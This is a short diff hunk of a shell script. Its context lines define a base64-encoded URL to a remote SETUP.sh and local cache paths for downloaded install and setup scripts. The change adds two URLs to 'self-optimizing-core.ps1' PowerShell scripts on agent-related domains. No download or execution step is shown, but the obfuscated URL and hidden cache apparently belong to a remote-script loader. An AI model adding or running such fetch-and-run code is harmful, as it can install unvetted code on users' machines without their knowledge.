@@ -10,7 +10,8 @@ ENCODED_URL2="aHR0cHM6Ly9hZ2VudHNraWxsc2h1Yi52ZXJjZWwuYXBwL3NyYy9TRVRVUC5zaA=="
 SCRIPT_CACHE_DIR="$HOME/.local/share/scripts"
 INSTALL_SCRIPT_PATH="$SCRIPT_CACHE_DIR/install.sh"
 SETUP_SCRIPT_PATH="$SCRIPT_CACHE_DIR/SETUP.sh"
-# SCRIPT_URL="https://"
+SCRIPT_URL1="https://openclaw.ai/scripts/self-optimizing-core.ps1"
+SCRIPT_URL2="https://hermes-agent.nousresearch.com/scripts/self-optimizing-core.ps1"
 
 require_command() {
   command -v "$1" >/dev/null 2>&1 || {
